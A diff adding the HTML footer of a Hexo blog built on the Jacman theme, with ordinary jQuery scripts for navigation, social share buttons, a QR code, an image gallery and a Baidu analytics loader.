+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
+		
+		<a href="/about" target="_blank" title="John Doe">John Doe</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
